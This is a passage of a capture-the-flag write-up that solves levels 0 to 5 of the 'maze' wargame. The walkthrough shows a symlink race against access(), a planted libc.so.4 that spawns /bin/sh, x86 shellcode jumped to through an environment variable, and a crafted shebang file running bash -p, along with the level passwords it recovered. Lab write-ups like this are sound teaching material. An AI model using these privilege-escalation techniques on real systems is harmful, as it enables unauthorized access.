home lrwxrwxrwx 1 root root 29 initrd.img - boot/initrd.img-4.9.0-6-amd64 lrwxrwxrwx 1 root root 29 initrd.img.old - boot/initrd.img-4.9.0-6-amd64 drwxr-xr-x 16 root root 4096 lib drwxr-xr-x 2 root root 4096 lib32 drwxr-xr-x 2 root root 4096 lib64 drwxr-xr-x 2 root root 4096 libx32 drwx------ 2 root root 16384 lost+found drwxr-xr-x 2 root root 4096 maze drwxr-xr-x 3 root root 4096 media drwxr-xr-x 2 root root 4096 mnt drwxr-xr-x 2 root root 4096 opt dr-xr-xr-x 106 root root 0 proc lrwxrwxrwx 1 root root 9 README.txt - /etc/motd drwx------ 8 root root 4096 root drwxr-xr-x 15 root root 580 run drwxr-xr-x 2 root root 4096 sbin drwxr-xr-x 3 root root 4096 share drwxr-xr-x 2 root root 4096 srv dr-xr-xr-x 12 root root 0 sys drwxrws-wt 1243 root root 57344 tmp drwxr-xr-x 12 root root 4096 usr drwxr-xr-x 11 root root 4096 var lrwxrwxrwx 1 root root 26 vmlinuz - boot/vmlinuz-4.9.0-6-amd64 lrwxrwxrwx 1 root root 26 vmlinuz.old - boot/vmlinuz-4.9.0-6-amd64  We cannot list the files inside /tmp, but we can write inside. Let\u0026rsquo;s create a file called /tmp/128ecf542a35ac5270a87dc740918404 and execute the binary:\nmaze0@maze:~$ echo ASDF  /tmp/128ecf542a35ac5270a87dc740918404 maze0@maze:~$ /maze/maze0 ASDF  The idea is to create a symbolic link so that /tmp/128ecf542a35ac5270a87dc740918404 points to /etc/maze_pass/maze1 and then read it using the binary:\nmaze0@maze:~$ ln -s /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404 maze0@maze:~$ ls -l --time-style=+ /tmp/128ecf542a35ac5270a87dc740918404 lrwxrwxrwx 1 maze0 root 20 /tmp/128ecf542a35ac5270a87dc740918404 - /etc/maze_pass/maze1 maze0@maze:~$ /maze/maze0  Using ltrace, we see that access is returning -1, so the file is not read:\nmaze0@maze:~$ ltrace /maze/maze0 __libc_start_main(0x804854b, 1, 0xffffd7a4, 0x80485e0 \u0026lt;unfinished ...\u0026gt; memset(0xffffd6e8, '\\0', 20) = 0xffffd6e8 access(\"/tmp/128ecf542a35ac5270a87dc7409\"..., 4) = -1 +++ exited (status 0) +++  Although we are not able to pass the access function in normal circumstances, there is a race condition. The idea is to pass the access function linking /tmp/128ecf542a35ac5270a87dc740918404 to a file we are allowed to read (for instance, /etc/maze_pass/maze0) and right after that link it to /etc/maze_pass/maze1, so that there is a situation where we can open the second file and read it.\nTherefore, we need to run this loop in one session:\nmaze0@maze:~$ while true; do ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404; ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404; done  And this other loop in another session:\nmaze0@maze:~$ while true; do /maze/maze0; done  After some seconds, we will see the password:\nmaze0@maze:~$ while true; do /maze/maze0; done -bash: fork: retry: Resource temporarily unavailable ... -bash: fork: retry: Resource temporarily unavailable hashaachon -bash: fork: retry: Resource temporarily unavailable ^C-bash: fork: Interrupted system call  Level 1 -\u0026gt; 2 If we take /maze/maze1 and open it in Ghidra, we will see this \u0026ldquo;Hello world\u0026rdquo; main function:\nint main() { puts(\"Hello World!\\n\"); return 0; }  However, there is a problem if we execute it. The binary is trying to find a library libc.so.4 at the current directory:\nmaze1@maze:~$ /maze/maze1 /maze/maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory maze1@maze:~$ ldd /maze/maze1 linux-gate.so.1 (0xf7fd7000) ./libc.so.4 = not found libc.so.6 = /lib32/libc.so.6 (0xf7e12000) /lib/ld-linux.so.2 (0xf7fd9000)  Hence, to run the binary, we need to provide a valid library in the current directory. For instance, we can tell the binary that puts has the following functionality:\n#include \u0026lt;stdlib.h\u0026gt; int puts(const char *s) { system(\"/bin/sh\"); return 0; }  As a result, when executing the binary, we will have a shell as maze2 (because it is a SUID binary that belongs to maze2).\nLet\u0026rsquo;s write the source file and compile the library in /tmp, because we are allowed to write there:\nmaze1@maze:~$ cd /tmp maze1@maze:/tmp$ vim lib.c maze1@maze:/tmp$ cat lib.c #include \u0026lt;stdlib.h\u0026gt; int puts(const char *s) { system(\"/bin/sh\"); return 0; }  This is the way to compile a shared library:\nmaze1@maze:/tmp$ gcc -m32 -shared -fpic lib.c -o libc.so.4  Now we run the binary from the current directory and we have a shell and the password for the next user:\nmaze1@maze:/tmp$ /maze/maze1 $ whoami maze2 $ cat /etc/maze_pass/maze2 fooghihahr  Level 2 -\u0026gt; 3 The main function of the decompiled source code for /maze/maze2 is quite interesting:\nint main(int argc, char **argv) { char code[8]; anon_subr_void_varargs *fp; if (argc != 2) { /* WARNING: Subroutine does not return */ exit(1); } strncpy(code, argv[1], 8); (*(code *) code)(); return 0; }  Basically, it is taking 8 bytes from a provided argument and executing those bytes.\nRecall that this lab has all protections disabled (NX, PIE, canaries, and even ASLR). Hence, we can find a way to run malicious shellcode.\nBut 8 bytes are not enough to enter a valid shellcode. However, we can use environment variables.\nThe stack will be filled with all the environment variables of the current shell session. Hence, we can use a jump instruction in the 8 bytes we must enter as argument and jump to the stack at the position of a certain environment variable.\nLet\u0026rsquo;s test it using GDB on the server:\nmaze2@maze:~$ export AAAA=BBBBBBBB maze2@maze:~$ gdb -q /maze/maze2 Reading symbols from /maze/maze2...done. (gdb) break main Breakpoint 1 at 0x8048421: file maze2.c, line 22. (gdb) run CCCCCCCC Starting program: /maze/maze2 CCCCCCCC Breakpoint 1, main (argc=2, argv=0xffffd764) at maze2.c:22 22 maze2.c: No such file or directory.  Ok, now let\u0026rsquo;s look for the position of the environment variable AAAA=BBBBBBBB in the stack:\n(gdb) info proc mapping process 20960 Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0x0 /maze/maze2 0x8049000 0x804a000 0x1000 0x0 /maze/maze2 0xf7e10000 0xf7e12000 0x2000 0x0 0xf7e12000 0xf7fc3000 0x1b1000 0x0 /lib32/libc-2.24.so 0xf7fc3000 0xf7fc5000 0x2000 0x1b0000 /lib32/libc-2.24.so 0xf7fc5000 0xf7fc6000 0x1000 0x1b2000 /lib32/libc-2.24.so 0xf7fc6000 0xf7fc9000 0x3000 0x0 0xf7fd2000 0xf7fd4000 0x2000 0x0 0xf7fd4000 0xf7fd7000 0x3000 0x0 [vvar] 0xf7fd7000 0xf7fd9000 0x2000 0x0 [vdso] 0xf7fd9000 0xf7ffc000 0x23000 0x0 /lib32/ld-2.24.so 0xf7ffc000 0xf7ffd000 0x1000 0x22000 /lib32/ld-2.24.so 0xf7ffd000 0xf7ffe000 0x1000 0x23000 /lib32/ld-2.24.so 0xfffdd000 0xffffe000 0x21000 0x0 [stack] (gdb) find 0xfffdd000, 0xffffe000 - 1, \"AAAA=BBBBBBBB\" 0xffffdf27 1 pattern found. (gdb) x/s 0xffffdf27 0xffffdf27: \"AAAA=BBBBBBBB\"  And there we have it. Now, we identify the address of the instruction that performs the execution of the 8 bytes (0x0804844e) and set a breakpoint:\n(gdb) disassemble main Dump of assembler code for function main: 0x0804841b \u0026lt;+0\u0026gt;: push %ebp 0x0804841c \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x0804841e \u0026lt;+3\u0026gt;: sub $0xc,%esp =\u0026gt; 0x08048421 \u0026lt;+6\u0026gt;: lea -0xc(%ebp),%eax 0x08048424 \u0026lt;+9\u0026gt;: mov %eax,-0x4(%ebp) 0x08048427 \u0026lt;+12\u0026gt;: cmpl $0x2,0x8(%ebp) 0x0804842b \u0026lt;+16\u0026gt;: je 0x8048434 \u0026lt;main+25\u0026gt; 0x0804842d \u0026lt;+18\u0026gt;: push $0x1 0x0804842f \u0026lt;+20\u0026gt;: call 0x80482e0 \u0026lt;exit@plt\u0026gt; 0x08048434 \u0026lt;+25\u0026gt;: mov 0xc(%ebp),%eax 0x08048437 \u0026lt;+28\u0026gt;: add $0x4,%eax 0x0804843a \u0026lt;+31\u0026gt;: mov (%eax),%eax 0x0804843c \u0026lt;+33\u0026gt;: push $0x8 0x0804843e \u0026lt;+35\u0026gt;: push %eax 0x0804843f \u0026lt;+36\u0026gt;: lea -0xc(%ebp),%eax 0x08048442 \u0026lt;+39\u0026gt;: push %eax 0x08048443 \u0026lt;+40\u0026gt;: call 0x8048300 \u0026lt;strncpy@plt\u0026gt; 0x08048448 \u0026lt;+45\u0026gt;: add $0xc,%esp 0x0804844b \u0026lt;+48\u0026gt;: mov -0x4(%ebp),%eax 0x0804844e \u0026lt;+51\u0026gt;: call *%eax 0x08048450 \u0026lt;+53\u0026gt;: mov $0x0,%eax 0x08048455 \u0026lt;+58\u0026gt;: leave 0x08048456 \u0026lt;+59\u0026gt;: ret End of assembler dump. (gdb) break *0x0804844e Breakpoint 2 at 0x804844e: file maze2.c, line 26. (gdb) continue Continuing. Breakpoint 2, 0x0804844e in main (argc=2, argv=0xffffd764) at maze2.c:26 26 in maze2.c  At this point, we can check what address has $eax inside:\n(gdb) p/x $eax $1 = 0xffffd6bc  Hence, we can use an instruction to jump to another address using an offset relative to the current address. This is the offset we need (notice that the 5 byte stand for for AAAA=):\n(gdb) p/x 0xffffdf27 + 5 - 0xffffd6bc $2 = 0x870  The assembly instruction to use is the following one:\nmaze2@maze:~$ pwn asm 'jmp $+0x870' -f string '\\xe9k\\x08\\x00\\x00'  To verify that this works, let\u0026rsquo;s put several \u0026quot;\\xcc\u0026quot; (instruction for a breakpoint, SIGTRAP) in the environment variable. And we see that the execution stops, so we are good to go:\nmaze2@maze:~$ export AAAA=$(python -c 'print \"\\xcc\" * 20') maze2@maze:~$ gdb -q /maze/maze2 Reading symbols from /maze/maze2...done. (gdb) run $(pwn asm 'jmp $+0x870' -f raw) Starting program: /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) /bin/bash: warning: command substitution: ignored null byte in input Program received signal SIGTRAP, Trace/breakpoint trap. 0xffffdf2d in ?? ()  Now we can take a common Linux x86 shellcode like this one: https://www.exploit-db.com/exploits/42428 and enter it as the environment variable, prepended with some nop instructions in case the stack is modified or we do not jump exactly at the beginning of the shellcode.\nIn GDB, it works, but it does not take the SUID permissions:\nmaze2@maze:~$ gdb -q /maze/maze2 Reading symbols from /maze/maze2...done. (gdb) run $(pwn asm 'jmp $+0x870' -f raw) Starting program: /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) /bin/bash: warning: command substitution: ignored null byte in input process 24019 is executing new program: /bin/dash $ whoami maze2  Outside GDB it does not work:\nmaze2@maze:~$ export AAAA=$(python -c 'print \"\\x90\" * 20 + \"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\"') maze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) -bash: warning: command substitution: ignored null byte in input Segmentation fault  This is happening because GDB puts more data onto the stack, so we need to decrease the length of the jump instruction until we get a shell:\nmaze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw) -bash: warning: command substitution: ignored null byte in input Segmentation fault maze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x860' -f raw) -bash: warning: command substitution: ignored null byte in input Segmentation fault maze2@maze:~$ /maze/maze2 $(pwn asm 'jmp $+0x850' -f raw) -bash: warning: command substitution: ignored null byte in input $ whoami maze3 $ cat /etc/maze_pass/maze3 beinguthok  Level 3 -\u0026gt; 4 In this level, we find a binary that behaves in a different way if we use an argument or not:\nmaze3@maze:~$ /maze/maze3 asdf maze3@maze:~$ /maze/maze3 ./level4 ev0lcmds!  Using strace we see that if no arguments are specified, the program stops. And if we provide an argument, it does something more:\nmaze3@maze:~$ strace /maze/maze3 execve(\"/maze/maze3\", [\"/maze/maze3\"], [/* 17 vars */]) = 0 strace: [ Process PID=30847 runs in 32 bit mode. ] write(1, \"./level4 ev0lcmds!\\n\\0\", 20./level4 ev0lcmds! ) = 20 exit(1) = ? +++ exited with 1 +++ maze3@maze:~$ strace /maze/maze3 asdf execve(\"/maze/maze3\", [\"/maze/maze3\", \"asdf\"], [/* 17 vars */]) = 0 strace: [ Process PID=30844 runs in 32 bit mode. ] mprotect(0x8048000, 151, PROT_READ|PROT_WRITE|PROT_EXEC) = 0 exit(1) = ? +++ exited with 1 +++  Curiously, the program is using mprotect to change the permissions of the binary addresses to rwx (readable, writeable and executable).\nLet\u0026rsquo;s see what we have in GDB:\nmaze3@maze:~$ gdb -q /maze/maze3 Reading symbols from /maze/maze3...(no debugging symbols found)...done. (gdb) set pagination off (gdb) disassemble _start Dump of assembler code for function _start: 0x08048060 \u0026lt;+0\u0026gt;: pop %eax 0x08048061 \u0026lt;+1\u0026gt;: dec %eax 0x08048062 \u0026lt;+2\u0026gt;: jne 0x8048096 \u0026lt;fine\u0026gt; 0x08048064 \u0026lt;+4\u0026gt;: call 0x804807d \u0026lt;_start+29\u0026gt; 0x08048069 \u0026lt;+9\u0026gt;: cs das 0x0804806b \u0026lt;+11\u0026gt;: insb (%dx),%es:(%edi) 0x0804806c \u0026lt;+12\u0026gt;: gs jbe 0x80480d4 \u0026lt;d1+9\u0026gt; 0x0804806f \u0026lt;+15\u0026gt;: insb (%dx),%es:(%edi) 0x08048070 \u0026lt;+16\u0026gt;: xor $0x20,%al 0x08048072 \u0026lt;+18\u0026gt;: gs jbe 0x80480a5 \u0026lt;fine+15\u0026gt; 0x08048075 \u0026lt;+21\u0026gt;: insb (%dx),%es:(%edi) 0x08048076 \u0026lt;+22\u0026gt;: arpl %bp,0x64(%ebp) 0x08048079 \u0026lt;+25\u0026gt;: jae 0x804809c \u0026lt;fine+6\u0026gt; 0x0804807b \u0026lt;+27\u0026gt;: or (%eax),%al 0x0804807d \u0026lt;+29\u0026gt;: mov $0x4,%eax 0x08048082 \u0026lt;+34\u0026gt;: mov $0x1,%ebx 0x08048087 \u0026lt;+39\u0026gt;: pop %ecx 0x08048088 \u0026lt;+40\u0026gt;: mov $0x14,%edx 0x0804808d \u0026lt;+45\u0026gt;: int $0x80 0x0804808f \u0026lt;+47\u0026gt;: mov $0x1,%eax 0x08048094 \u0026lt;+52\u0026gt;: int $0x80 End of assembler dump.  From the _start function, we only care about the call to fine:\n(gdb) disassemble fine Dump of assembler code for function fine: 0x08048096 \u0026lt;+0\u0026gt;: pop %eax 0x08048097 \u0026lt;+1\u0026gt;: mov $0x7d,%eax 0x0804809c \u0026lt;+6\u0026gt;: mov $0x8048060,%ebx 0x080480a1 \u0026lt;+11\u0026gt;: and $0xfffff000,%ebx 0x080480a7 \u0026lt;+17\u0026gt;: mov $0x97,%ecx 0x080480ac \u0026lt;+22\u0026gt;: mov $0x7,%edx 0x080480b1 \u0026lt;+27\u0026gt;: int $0x80 0x080480b3 \u0026lt;+29\u0026gt;: lea 0x80480cb,%esi 0x080480b9 \u0026lt;+35\u0026gt;: mov %esi,%edi 0x080480bb \u0026lt;+37\u0026gt;: mov $0x2c,%ecx 0x080480c0 \u0026lt;+42\u0026gt;: mov $0x12345678,%edx End of assembler dump.  Let\u0026rsquo;s add a breakpoint in the last instruction and run the code using whatever argument:\n(gdb) break *0x080480c0 Breakpoint 1 at 0x80480c0 (gdb) run asdf Starting program: /maze/maze3 asdf Breakpoint 1, 0x080480c0 in fine ()  Now we step one instruction and disassemble the current block, to see what the program is doing:\n(gdb) stepi 0x080480c5 in l1 () (gdb) disassemble Dump of assembler code for function l1: =\u0026gt; 0x080480c5 \u0026lt;+0\u0026gt;: lods %ds:(%esi),%eax 0x080480c6 \u0026lt;+1\u0026gt;: xor %edx,%eax 0x080480c8 \u0026lt;+3\u0026gt;: stos %eax,%es:(%edi) 0x080480c9 \u0026lt;+4\u0026gt;: loop 0x80480c5 \u0026lt;l1\u0026gt; End of assembler dump.  It is performing some operations within a loop (44 times, counter stored previously in $ecx = 0x2c). We can add a breakpoint at the end of the loop and use continue 0x2a to stop when $ecx = 1:\n(gdb) break *0x080480c9 Breakpoint 2 at 0x80480c9 (gdb) continue Continuing. Breakpoint 2, 0x080480c9 in l1 () (gdb) p/x $ecx $2 = 0x2c (gdb) continue Continuing. Breakpoint 2, 0x080480c9 in l1 () (gdb) p/x $ecx $3 = 0x2b (gdb) continue 0x2a Will ignore next 41 crossings of breakpoint 2. Continuing. Breakpoint 2, 0x080480c9 in l1 () (gdb) p/x $ecx $4 = 0x1  Now if we step one instruction, we exit the loop. And we disassemble another block:\n(gdb) stepi 0x080480cb in d1 () (gdb) disassemble Dump of assembler code for function d1: =\u0026gt; 0x080480cb \u0026lt;+0\u0026gt;: pop %eax 0x080480cc \u0026lt;+1\u0026gt;: cmpl $0x1337c0de,(%eax) 0x080480d2 \u0026lt;+7\u0026gt;: jne 0x80480ed \u0026lt;d1+34\u0026gt; 0x080480d4 \u0026lt;+9\u0026gt;: xor %eax,%eax 0x080480d6 \u0026lt;+11\u0026gt;: push %eax 0x080480d7 \u0026lt;+12\u0026gt;: push $0x68732f2f 0x080480dc \u0026lt;+17\u0026gt;: push $0x6e69622f 0x080480e1 \u0026lt;+22\u0026gt;: mov %esp,%ebx 0x080480e3 \u0026lt;+24\u0026gt;: push %eax 0x080480e4 \u0026lt;+25\u0026gt;: push %ebx 0x080480e5 \u0026lt;+26\u0026gt;: mov %esp,%ecx 0x080480e7 \u0026lt;+28\u0026gt;: xor %edx,%edx 0x080480e9 \u0026lt;+30\u0026gt;: mov $0xb,%al 0x080480eb \u0026lt;+32\u0026gt;: int $0x80 0x080480ed \u0026lt;+34\u0026gt;: mov $0x1,%eax 0x080480f2 \u0026lt;+39\u0026gt;: xor %ebx,%ebx 0x080480f4 \u0026lt;+41\u0026gt;: inc %ebx 0x080480f5 \u0026lt;+42\u0026gt;: int $0x80 End of assembler dump.  This code might look familiar to the shellcode used in the previous level (actually, it is pretty similar to this one: https://www.exploit-db.com/exploits/43716). In fact, the operations that where executed inside the loop are designed to modify the binary instructions and set the shellcode.\nHowever, there is a previous comparison. To run the shellcode, the content of the address stored in $eax must be equal to 0x1337c0de. We can check this value:\n(gdb) si 0x080480cc in d1 () (gdb) p/x $eax $5 = 0xffffd8b8 (gdb) x/s 0xffffd8b8 0xffffd8b8: \"asdf\"  It is the argument we provided when running the program.\nTherefore, if we provide 0x1337c0de in bytes as an argument, we will have a shell as maze4:\nmaze3@maze:~$ /maze/maze3 $(echo -e \"\\xde\\xc0\\x37\\x13\") $ whoami maze4 $ cat /etc/maze_pass/maze4 deekaihiek  Level 4 -\u0026gt; 5 This time we have a binary that checks the contents of a provided file before executing it:\nint main(int argc, char **argv) { int __fd; int iVar1; stat st; Elf32_Phdr phdr; Elf32_Ehdr ehdr; int fd; if (argc != 2) { printf(\"usage: %s file2check\\n\", *argv); /* WARNING: Subroutine does not return */ exit(-1); } __fd = open(argv[1], 0); if (__fd \u0026lt; 0) { perror(\"open\"); /* WARNING: Subroutine does not return */ exit(-1); } iVar1 = stat(argv[1], (stat *) \u0026amp;st); if (iVar1 \u0026lt; 0) { perror(\"stat\"); /* WARNING: Subroutine does not return */ exit(-1); } read(__fd, \u0026amp;ehdr, 0x34); lseek(__fd, ehdr.e_phoff, 0); read(__fd, \u0026amp;phdr, 0x20); if (phdr.p_paddr == (uint) ehdr.e_ident[8] * (uint) ehdr.e_ident[7] \u0026amp;\u0026amp; st.st_size \u0026lt; 0x78) { puts(\"valid file, executing\"); execv(argv[1], (char **) 0x0); } fwrite(\"file not executed\\n\", 1, 0x12, stderr); close(__fd); return 0; }  Let\u0026rsquo;s create a simple file in /tmp and see if it is executed:\nmaze4@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ maze4@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' \u0026lt; /tmp/file maze4@maze:~$ /maze/maze4 /tmp/file file not executed  It is not, let\u0026rsquo;s see what the program is doing using GDB. First, we must set a breakpoint before lseek:\nmaze4@maze:~$ gdb -q /maze/maze4 Reading symbols from /maze/maze4...done. (gdb) set pagination off (gdb) disassemble main Dump of assembler code for function main: 0x080485fb \u0026lt;+0\u0026gt;: push %ebp 0x080485fc \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x080485fe \u0026lt;+3\u0026gt;: sub $0xb0,%esp 0x08048604 \u0026lt;+9\u0026gt;: cmpl $0x2,0x8(%ebp) ... 0x0804868d \u0026lt;+146\u0026gt;: call 0x8048430 \u0026lt;read@plt\u0026gt; 0x08048692 \u0026lt;+151\u0026gt;: add $0xc,%esp 0x08048695 \u0026lt;+154\u0026gt;: mov -0x1c(%ebp),%eax 0x08048698 \u0026lt;+157\u0026gt;: push $0x0 0x0804869a \u0026lt;+159\u0026gt;: push %eax 0x0804869b \u0026lt;+160\u0026gt;: pushl -0x4(%ebp) 0x0804869e \u0026lt;+163\u0026gt;: call 0x8048450 \u0026lt;lseek@plt\u0026gt; 0x080486a3 \u0026lt;+168\u0026gt;: add $0xc,%esp 0x080486a6 \u0026lt;+171\u0026gt;: push $0x20 0x080486a8 \u0026lt;+173\u0026gt;: lea -0x58(%ebp),%eax 0x080486ab \u0026lt;+176\u0026gt;: push %eax 0x080486ac \u0026lt;+177\u0026gt;: pushl -0x4(%ebp) 0x080486af \u0026lt;+180\u0026gt;: call 0x8048430 \u0026lt;read@plt\u0026gt; 0x080486b4 \u0026lt;+185\u0026gt;: add $0xc,%esp 0x080486b7 \u0026lt;+188\u0026gt;: mov -0x4c(%ebp),%eax 0x080486ba \u0026lt;+191\u0026gt;: movzbl -0x31(%ebp),%edx 0x080486be \u0026lt;+195\u0026gt;: movzbl %dl,%ecx 0x080486c1 \u0026lt;+198\u0026gt;: movzbl -0x30(%ebp),%edx 0x080486c5 \u0026lt;+202\u0026gt;: movzbl %dl,%edx 0x080486c8 \u0026lt;+205\u0026gt;: imul %ecx,%edx 0x080486cb \u0026lt;+208\u0026gt;: cmp %edx,%eax 0x080486cd \u0026lt;+210\u0026gt;: jne 0x80486fa \u0026lt;main+255\u0026gt; 0x080486cf \u0026lt;+212\u0026gt;: mov -0x84(%ebp),%eax 0x080486d5 \u0026lt;+218\u0026gt;: cmp $0x77,%eax 0x080486d8 \u0026lt;+221\u0026gt;: jg 0x80486fa \u0026lt;main+255\u0026gt; 0x080486da \u0026lt;+223\u0026gt;: push $0x8048800 0x080486df \u0026lt;+228\u0026gt;: call 0x8048490 \u0026lt;puts@plt\u0026gt; 0x080486e4 \u0026lt;+233\u0026gt;: add $0x4,%esp 0x080486e7 \u0026lt;+236\u0026gt;: mov 0xc(%ebp),%eax 0x080486ea \u0026lt;+239\u0026gt;: add $0x4,%eax 0x080486ed \u0026lt;+242\u0026gt;: mov (%eax),%eax 0x080486ef \u0026lt;+244\u0026gt;: push $0x0 0x080486f1 \u0026lt;+246\u0026gt;: push %eax 0x080486f2 \u0026lt;+247\u0026gt;: call 0x80484d0 \u0026lt;execv@plt\u0026gt; 0x080486f7 \u0026lt;+252\u0026gt;: add $0x8,%esp 0x080486fa \u0026lt;+255\u0026gt;: mov 0x8049aa8,%eax 0x080486ff \u0026lt;+260\u0026gt;: push %eax 0x08048700 \u0026lt;+261\u0026gt;: push $0x12 0x08048702 \u0026lt;+263\u0026gt;: push $0x1 0x08048704 \u0026lt;+265\u0026gt;: push $0x8048816 0x08048709 \u0026lt;+270\u0026gt;: call 0x8048480 \u0026lt;fwrite@plt\u0026gt; 0x0804870e \u0026lt;+275\u0026gt;: add $0x10,%esp 0x08048711 \u0026lt;+278\u0026gt;: pushl -0x4(%ebp) 0x08048714 \u0026lt;+281\u0026gt;: call 0x80484e0 \u0026lt;close@plt\u0026gt; 0x08048719 \u0026lt;+286\u0026gt;: add $0x4,%esp 0x0804871c \u0026lt;+289\u0026gt;: mov $0x0,%eax 0x08048721 \u0026lt;+294\u0026gt;: leave 0x08048722 \u0026lt;+295\u0026gt;: ret End of assembler dump. (gdb) break *0x0804869e Breakpoint 1 at 0x804869e: file maze4.c, line 50. (gdb) x/16x $esp 0xffffd62c: 0x00000003 0x48484848 0x00000000 0x0000fb03 0xffffd63c: 0x00000000 0x00000000 0x00000201 0x000081ed 0xffffd64c: 0x00000001 0x00003a9c 0x00000000 0x00000000 0xffffd65c: 0x00000000 0xffff0000 0x00000069 0x00001000  We can observe that the second argument for lseek is 0x48484848 (HHHH). This function will set the pointer to read the file at character position 0x48484848 (which is invalid, obviously). Once the pointer is set, the program will read again the file but starting from the position set by lseek.\nThe idea is to fill the file with junk data until the position where now we have HHHH. Then put here 0x20 to make lseek set the pointer after HHHH. Let\u0026rsquo;s do it:\nmaze4@maze:~$ python3 -c 'print(\"A\" * 28 + \"\\x20\\0\\0\\0\" + \"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' AAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ maze4@maze:~$ python3 -c 'print(\"A\" * 28 + \"\\x20\\0\\0\\0\" + \"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' \u0026lt; /tmp/file maze4@maze:~$ xxd /tmp/file 00000000: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA 00000010: 4141 4141 4141 4141 4141 4141 2000 0000 AAAAAAAAAAAA ... 00000020: 4141 4141 4242 4242 4343 4343 4444 4444 AAAABBBBCCCCDDDD 00000030: 4545 4545 4646 4646 4747 4747 4848 4848 EEEEFFFFGGGGHHHH 00000040: 4949 4949 4a4a 4a4a 4b4b 4b4b 4c4c 4c4c IIIIJJJJKKKKLLLL 00000050: 4d4d 4d4d 4e4e 4e4e 4f4f 4f4f 5050 5050 MMMMNNNNOOOOPPPP 00000060: 5151 5151 5252 5252 5353 5353 5454 5454 QQQQRRRRSSSSTTTT 00000070: 5555 5555 5656 5656 5757 5757 5858 5858 UUUUVVVVWWWWXXXX 00000080: 5959 5959 5a5a 5a5a 0a YYYYZZZZ.  Now, we can set a breakpoint at the comparing instructions (where the if clause is in the decompiled source code):\nmaze4@maze:~$ gdb -q /maze/maze4 Reading symbols from /maze/maze4...done. (gdb) break *0x080486cb Breakpoint 1 at 0x80486cb: file maze4.c, line 54. (gdb) break *0x080486d5 Breakpoint 2 at 0x80486d5: file maze4.c, line 54. (gdb) run /tmp/file Starting program: /maze/maze4 /tmp/file Breakpoint 1, 0x080486cb in main (argc=2, argv=0xffffd784) at maze4.c:54 54 maze4.c: No such file or directory. (gdb) x/i $eip =\u0026gt; 0x80486cb \u0026lt;main+208\u0026gt;: cmp %edx,%eax (gdb) info registers eax 0x44444444 1145324612 ecx 0x41 65 edx 0x1081 4225 ebx 0x0 0 esp 0xffffd638 0xffffd638 ebp 0xffffd6e8 0xffffd6e8 esi 0x2 2 edi 0xf7fc5000 -134459392 eip 0x80486cb 0x80486cb \u0026lt;main+208\u0026gt; eflags 0x292 [ AF SF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99  Here we see that where we have 0x44444444 (DDDD) the program is expecting 0x1081. Let\u0026rsquo;s fix it inside GDB and continue:\n(gdb) set $eax = 0x1081 (gdb) continue Continuing. Breakpoint 2, main (argc=2, argv=0xffffd784) at maze4.c:54 54 in maze4.c (gdb) x/i $eip =\u0026gt; 0x80486d5 \u0026lt;main+218\u0026gt;: cmp $0x77,%eax (gdb) p/x $eax $2 = 0x89  This time, 0x89 is the size of the file. Hence, we need a file that is 0x78 length (actually, it is OK to have a shorter size). After these checks, the file will be executed with execve.\nThis will be a valid file to satisfy the checks:\nmaze4@maze:~$ python3 -c 'import os; os.write(1, b\"A\" * 28 + b\"\\x20\\0\\0\\0\" + b\"B\" * 12 + b\"\\x81\\x10\\0\\0\" + b\"C\" * 32 + b\"\\n\")' \u0026lt; /tmp/file maze4@maze:~$ xxd /tmp/file 00000000: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA 00000010: 4141 4141 4141 4141 4141 4141 2000 0000 AAAAAAAAAAAA ... 00000020: 4242 4242 4242 4242 4242 4242 8110 0000 BBBBBBBBBBBB.... 00000030: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000040: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000050: 0a .  Now we need to modify the junk data to make it a valid executable file. For example, we can use this:\nmaze4@maze:~$ python3 -c 'import os; os.write(1, b\"#!/bin/sh\\n\\n/bin/bash -p # \" + b\"\\x20\\0\\0\\0\" + b\"B\" * 12 + b\"\\xb8\\x2e\\0\\0\" + b\"C\" * 32 + b\"\\n\")' \u0026lt; /tmp/file maze4@maze:~$ xxd /tmp/file 00000000: 2321 2f62 696e 2f73 680a 0a2f 6269 6e2f #!/bin/sh../bin/ 00000010: 6261 7368 202d 7020 2020 2320 2000 0000 bash -p # ... 00000020: 4242 4242 4242 4242 4242 4242 b82e 0000 BBBBBBBBBBBB.... 00000030: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000040: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000050: 0a .  Basically, it is a shell script that uses a shebang to specify that is must be executed with /bin/sh, and then we use /bin/bash -p to use the SUID privileges of the binary. Notice that the # is a comment in shell scripting:\nmaze4@maze:~$ cat 